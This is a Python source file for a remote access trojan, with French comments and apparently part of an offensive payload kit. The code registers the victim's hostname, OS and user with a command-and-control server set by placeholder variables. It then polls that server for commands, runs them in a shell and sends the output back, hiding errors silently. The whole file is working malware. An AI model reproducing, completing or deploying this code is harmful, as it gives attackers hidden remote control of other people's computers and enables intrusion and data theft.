#!/usr/bin/env python3
"""
payloads/rat.py — RAT HTTP polling
Poll le C2 toutes les POLL secondes, exécute la commande, renvoie le résultat.
Variables injectées : FILL_C2_HOST, FILL_PORT
"""
import subprocess, platform, os, socket, json, time, urllib.request

C2     = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID = socket.gethostname()
POLL   = 10  # secondes

def _post(url, data):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def _get_json(url):
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            return json.loads(r.read())
    except Exception:
        return {}

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
    })

def run_cmd(cmd: str) -> str:
    if cmd.lower().startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            return f"cwd: {os.getcwd()}"
        except Exception as e:
            return str(e)
    if cmd.lower() == "sysinfo":
        return (f"host={socket.gethostname()}\n"
                f"os={platform.platform()}\n"
                f"user={os.getlogin()}\n"
                f"cwd={os.getcwd()}\n"
                f"py={platform.python_version()}")
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=30,
        )
        return (r.stdout + r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "timeout (30s)"
    except Exception as e:
        return str(e)

register()
while True:
    try:
        data = _get_json(f"{C2}/c2/task/{BOT_ID}")
        cmd  = data.get("cmd", "").strip()
        if cmd:
            result = run_cmd(cmd)
            _post(f"{C2}/c2/result/{BOT_ID}", {"result": result})
    except Exception:
        pass
    time.sleep(POLL)